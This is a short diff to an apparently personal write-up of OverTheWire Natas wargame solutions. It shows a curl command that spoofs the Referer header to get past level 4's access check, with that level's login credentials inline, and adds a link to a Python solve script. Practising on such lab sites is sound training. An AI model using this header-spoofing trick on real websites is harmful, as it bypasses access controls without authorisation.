@@ -60,3 +60,6 @@
 
 - curl:
     - ```curl -sv http://natas4.natas.labs.overthewire.org/index.php -H "Referer: http://natas5.natas.labs.overthewire.org/" --user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ | grep "Access" | cut -d' ' -f8```
+
+-python:
+    - [natas4/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas4/solve.py)
